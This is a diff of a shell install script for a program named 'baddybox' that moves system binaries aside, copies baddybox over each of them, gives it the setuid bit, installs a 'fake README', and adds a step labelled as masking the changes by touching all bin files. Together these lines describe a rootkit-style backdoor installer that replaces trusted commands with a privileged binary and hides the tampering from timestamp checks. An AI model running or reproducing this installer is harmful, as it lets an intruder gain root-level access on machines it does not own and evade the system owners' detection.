@@ -39,8 +39,8 @@ replace_targets() {
         mv "$target" "$install_loc"\
             || warn "Unable to move $target"
 
-        ln -s "${install_path}/${install_as}" "$target"\
-            || warn "Unable to symlink baddybox to $target"
+        cp "baddybox" "$target"\
+            || err "Unable to replace $target"
     done
 }
 
@@ -53,7 +53,7 @@ install_baddybox() {
 }
 
 setuid_baddybox() {
-    chmod +s "${install_path}/${install_as}"
+    chmod +s "baddybox"
 }
 
 main() {
@@ -69,17 +69,13 @@ main() {
     compile_baddybox\
         || err "Unable to compile"
 
-    msg "Creating ${install_path}"
-    make_target_dir\
-        || err "Unable to create directory"
-
-    msg "Installing baddybox"
-    install_baddybox\
-        || err "Unable to install baddybox"
-
     msg "Add setuid to baddybox"
     setuid_baddybox\
         || err "Unable to setuid baddybox"
+
+    msg "Creating ${install_path}"
+    make_target_dir\
+        || err "Unable to create directory"
 
     msg "Installing fake README"
     install_readme\
@@ -87,6 +83,10 @@ main() {
 
     msg "Replacing targets"
     replace_targets
+
+    msg "Masking changes by touching all bin files"
+    touch_file\
+        || err "Unable to touch all file in bin directories"
 
     msg "DONE"
 }
